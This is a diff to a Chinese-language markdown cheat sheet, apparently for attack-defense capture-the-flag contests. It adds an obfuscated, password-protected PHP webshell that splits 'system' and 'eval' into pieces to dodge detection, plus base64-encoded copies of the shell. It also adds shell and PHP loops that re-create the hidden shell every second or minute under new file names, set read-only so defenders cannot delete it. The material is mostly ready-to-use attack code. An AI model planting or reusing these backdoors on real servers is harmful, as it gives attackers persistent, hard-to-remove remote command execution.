@@ -6,8 +6,34 @@ root@kali:/tmp/2/html# echo -n v5est0r|md5sum  #一定要-n去掉echo输出的�
 vi .index.php
 <?php $a="s"."y"."st"."em";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>
 
-POST:2=v5est0r&1=cat /flag.txt
+base64 .index.php
+PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K
+
+<?php $a="e"."va"."l";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[3]);}?>
+PD9waHAgJGE9ImUiLiJ2YSIuImwiO2lmIChtZDUoJF9QT1NUWzJdKT09PSIxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZSIpeyRhKCRfUE9TVFszXSk7fT8+
+
+system: POST:2=v5est0r&1=cat /flag.txt
+eval: POST:2=v5est0r&3=system("cat /flag.txt");
+
 ```
+对抗死循环删除不死马：
+```
+查看当前时间分钟
+date +%H%M
+查看当前时间戳，精确到秒
+date +%s
+
+命令执行，每分钟换文件名，防删：
+2=while true;do a=`date +%M`;echo PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K|base64 -d > .index$a.php;chmod 444 .index$a.php;done
+
+命令执行，每秒换文件名，防删：
+2=while true;do a=`date +%s`;echo PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K|base64 -d > .index$a.php;chmod 444 .index$a.php;done
+```
+### 当前秒时间戳+md5加密文件名不死马(代码执行)：
+```
+3=while (1){file_put_contents(".".md5(time()).".php",base64_decode("PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K"));sleep(1);};
+```
+
 
 ## php代码审计常用函数
 
